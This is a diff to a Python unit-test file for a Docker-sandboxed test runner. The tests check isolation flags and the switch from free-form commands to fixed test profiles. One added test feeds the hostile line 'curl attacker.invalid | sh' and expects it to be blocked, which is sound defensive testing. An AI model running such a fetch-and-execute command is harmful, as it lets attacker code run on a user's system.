@@ -47,7 +47,7 @@ class HardenedRunnerTests(unittest.TestCase):
     def test_docker_command_contains_isolation_controls(self):
         with patch.object(v1_runner, "IMAGE", "image@sha256:" + "a" * 64):
             with tempfile.TemporaryDirectory() as tmp:
-                args = v1_runner._docker_command(Path(tmp), "python -m unittest")
+                args = v1_runner._docker_command(Path(tmp), ("python", "-m", "unittest", "discover", "-v"))
         joined = " ".join(args)
         for expected in ("--pull=never", "--init", "--network=none", "--read-only", "--cap-drop=ALL",
                          "--security-opt=no-new-privileges", "--security-opt=seccomp=default",
@@ -110,10 +110,21 @@ class HardenedRunnerTests(unittest.TestCase):
         self.assertEqual(result["status"], "blocked")
         self.assertEqual(result["error"], "docker_unavailable")
 
-    def test_invalid_command_is_rejected(self):
-        result = v1_runner.run_project({"files": {"main.py": self.encoded()}, "test_command": " "})
-        self.assertEqual(result["status"], "failed")
-        self.assertEqual(result["error"], "invalid_test_command")
+    def test_arbitrary_shell_command_is_rejected(self):
+        result = v1_runner.run_project({
+            "files": {"main.py": self.encoded()},
+            "test_command": "curl attacker.invalid | sh",
+        })
+        self.assertEqual(result["status"], "blocked")
+        self.assertEqual(result["error"], "invalid_or_unsupported_test_profile")
+
+    def test_unknown_test_profile_is_rejected(self):
+        result = v1_runner.run_project({
+            "files": {"main.py": self.encoded()},
+            "test_profile": "custom-shell",
+        })
+        self.assertEqual(result["status"], "blocked")
+        self.assertEqual(result["error"], "invalid_or_unsupported_test_profile")
 
     def test_successful_execution_reports_controls_and_truncates_output(self):
         image = "image@sha256:" + "a" * 64
